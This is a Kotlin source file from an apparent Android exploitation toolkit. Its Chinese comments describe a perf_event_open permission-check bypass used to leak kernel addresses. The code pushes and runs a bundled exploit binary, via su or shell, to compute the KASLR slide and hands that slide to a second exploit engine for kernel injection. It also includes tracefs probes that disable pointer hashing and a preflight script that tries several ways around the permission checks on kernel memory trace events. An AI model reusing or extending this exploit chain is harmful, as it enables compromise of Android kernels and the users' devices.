package com.extractkit.app

import android.content.Context
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

/**
 * CVE-2026-98937 的**标定器**（我们自己实现，无第三方二进制）。
 *
 * 98937 的本体是 perf/core 的权限检查绕过：`perf_event_open` 只在
 * `!attr.exclude_kernel` 时才调 `perf_allow_kernel()`，所以设
 * `exclude_kernel=1` 同时保留 `PERF_SAMPLE_CALLCHAIN` +
 * `exclude_callchain_kernel=0`，就能让内核栈帧进 ring buffer。
 *
 * 它只给地址，不给 root；我们把它当「KASLR slide 的第三个来源」：
 *
 *   kmem 事件（有权限时） → perf callchain → slide
 *   slide 交给 98260 引擎（EXTRACTKIT_SLIDE），注入走 98260 的窗口判据
 *
 * 也就是说：**98937 只负责标定，不负责注入**。它自己那条注入路径依赖
 * `mm_page_*` / `kmem_cache_free` 的 enable，本机一律 EACCES，跑不起来。
 */
object Cve98937 {

    private const val WORK = "/data/local/tmp/extract-kit"

    /**
     * 跑自有标定器 `cve-2026-98937-calib`。
     *
     * 成功返回 `slide to pageOffset`（pageOffset 可能为空串），失败 null。
     * 标定器内部顺序：kmem 分配帧 → 失败则 perf callchain；page_offset
     * 只有在拿到 k_itimer 指针时才算，拿不到就留空。
     */
    suspend fun calibrateOwn(ctx: Context, log: (String) -> Unit): Pair<String, String>? =
        withContext(Dispatchers.IO) {
            if (!Shell.connected() && !Shell.connect(ctx)) {
                log("! shell 未就绪，自有标定跳过")
                return@withContext null
            }
            val bytes = runCatching {
                ctx.assets.open("payload/cve-2026-98937-calib").readBytes()
            }.getOrNull()
            if (bytes == null) {
                log("! 自有标定器未打包")
                return@withContext null
            }
            Shell.exec("mkdir -p $WORK")
            // 标定器读 /data/local/tmp/extract-kit/device.cfg 里的 STATIC_TIMER_SITE 等常量；
            // 不先下发就是编译期默认值（只对内置那台机器对），会算错 slide。
            val cfg = ConfigGen.cfgBytesForCurrentKernel(ctx)
            if (cfg == null) {
                log("! 本机没有可用的 device.cfg（未标定 / 内核不在表里），标定会算错 slide，先停")
                return@withContext null
            }
            Shell.pushFile("$WORK/device.cfg", cfg)
            log("· 已下发 device.cfg（${cfg.size} B）供标定器取锚点")
            val (prc, _) = Shell.pushFile("$WORK/cve98937-calib", bytes, executable = true)
            if (prc != 0) {
                log("! 自有标定器推送失败（rc=$prc）")
                return@withContext null
            }
            // tracefs 的 enable 对 uid=2000 一律 EACCES；有 su 就用 su 跑
            // （Shizuku 以 root 启动时 user service 是 uid 0）。
            val (_, idOut) = Shell.exec("su -c id 2>&1")
            val useSu = idOut.contains("uid=0")
            log(if (useSu) "· 标定走 su（root）" else "· 标定走 shell（uid=2000），事件通道可能被拒，仍会试 perf")
            val cmd = if (useSu) {
                "su -c 'cd $WORK && CVE98937_HOME=/data/local/tmp ./cve98937-calib 2>&1'"
            } else {
                "cd $WORK && CVE98937_HOME=$HOME ./cve98937-calib 2>&1"
            }
            val (_, out) = Shell.exec(cmd)
            out.lineSequence()
                .filter { it.isNotBlank() && !it.startsWith("SLIDE=") && !it.startsWith("PAGE_OFFSET=") }
                .forEach { log("  $it") }
            val slide = Regex("^SLIDE=(0x[0-9a-fA-F]+)", RegexOption.MULTILINE).find(out)?.groupValues?.get(1)
            val po = Regex("^PAGE_OFFSET=(0x[0-9a-fA-F]+)", RegexOption.MULTILINE).find(out)?.groupValues?.get(1)
            if (slide == null) null else slide to (po ?: "")
        }

    private const val HOME = "/data/local/tmp/extract-kit/gk98937"

    /**
     * 本机 tracefs 对 shell/root 的放行程度（只用来写日志，不决定成败）。
     *
     * 文本 `trace` 里的 `call_site` / `ptr` 默认符号化 + `%p` 哈希，要拿真地址
     * 必须能切 `options/sym-addr` 与 `options/hash-ptr`。
     */
    suspend fun tracefsAllowed(ctx: Context): Boolean = withContext(Dispatchers.IO) {
        if (!Shell.connected() && !Shell.connect(ctx)) return@withContext false
        val probe =
            "echo 1 > /sys/kernel/tracing/options/sym-addr 2>&1 && echo OK1; " +
                "echo 0 > /sys/kernel/tracing/options/hash-ptr 2>&1 && echo OK2; " +
                "echo 1 > /sys/kernel/tracing/events/kmem/mm_page_alloc/enable 2>&1 && echo OK3"
        val (_, rootOut) = Shell.exec("su -c '$probe' 2>&1")
        if (rootOut.contains("OK1") || rootOut.contains("OK2") || rootOut.contains("OK3")) return@withContext true
        val (_, out) = Shell.exec(probe)
        out.contains("OK1") || out.contains("OK2") || out.contains("OK3")
    }

    /** 从输出里抓某个 `KEY=value`。 */
    fun field(out: String, key: String): String? =
        out.lineSequence().firstOrNull { it.startsWith("$key=") }?.substringAfter('=')?.trim()

    /**
     * 事件自检：逐个事件试三种写法，只用于告诉用户「这台机器能不能收到事件」。
     *
     * - direct   = 直接写 `events/kmem/<e>/enable`
     * - holder   = 借 `events/kmem/rss_stat/enable` 写 `enable_event:kmem:<e>`
     * - instance = 在 `instances/ek/` 下开关（独立缓冲区，权限检查不同）
     *
     * 三个都是 0 才算真的能收到；全非 0 时 98937 的注入路径不可用，
     * 但**标定**仍能靠 perf 通道完成。
     */
    suspend fun preflight(ctx: Context, log: (String) -> Unit): Boolean = withContext(Dispatchers.IO) {
        if (!Shell.connected() && !Shell.connect(ctx)) {
            log("! shell 未就绪，跳过事件自检")
            return@withContext false
        }
        Shell.exec("mkdir -p $WORK")
        val script = """
            T=/sys/kernel/tracing
            mkdir -p ${'$'}T/instances/ek 2>/dev/null
            for e in mm_page_alloc mm_page_free mm_page_pcpu_drain kmem_cache_alloc kmem_cache_free; do
              { echo 0 > ${'$'}T/events/kmem/${'$'}e/enable; } 2>/dev/null
              d=${'$'}?
              { echo "enable_event:kmem:${'$'}e" > ${'$'}T/events/kmem/rss_stat/enable; } 2>/dev/null
              h=${'$'}?
              { echo 0 > ${'$'}T/instances/ek/events/kmem/${'$'}e/enable; } 2>/dev/null
              i=${'$'}?
              echo "PRE ${'$'}e d=${'$'}d h=${'$'}h i=${'$'}i"
            done
            echo "PRE end"
        """.trimIndent()
        val (prc, _) = Shell.pushFile("$WORK/pre98937.sh", script.toByteArray(), executable = false)
        if (prc != 0) {
            log("! 自检脚本推送失败（rc=$prc）")
            return@withContext false
        }
        val (rc, out) = Shell.exec("sh $WORK/pre98937.sh 2>&1")
        var okAny = false
        var seen = 0
        for (line in out.lineSequence()) {
            val t = line.trim()
            if (t.startsWith("PRE ")) {
                if (t == "PRE end") continue
                val parts = t.split(' ')
                val ev = parts.getOrNull(1) ?: continue
                fun v(k: String): String = parts.firstOrNull { it.startsWith("$k=") }?.substringAfter('=') ?: "?"
                val d = v("d")
                val h = v("h")
                val i = v("i")
                val ok = d == "0" || h == "0" || i == "0"
                if (ok) okAny = true
                seen++
                log("· $ev: 直写=$d 宿主=$h 实例=$i${if (ok) "" else "（全被拒）"}")
            }
        }
        if (seen == 0) {
            log("! 自检脚本没有输出（rc=$rc），原始输出：")
            out.lineSequence().take(3).forEach { log("  $it") }
        } else if (!okAny) {
            log("! 事件通道全被拒：注入仍走 98260 的判据，标定走 perf")
        }
        okAny
    }
}
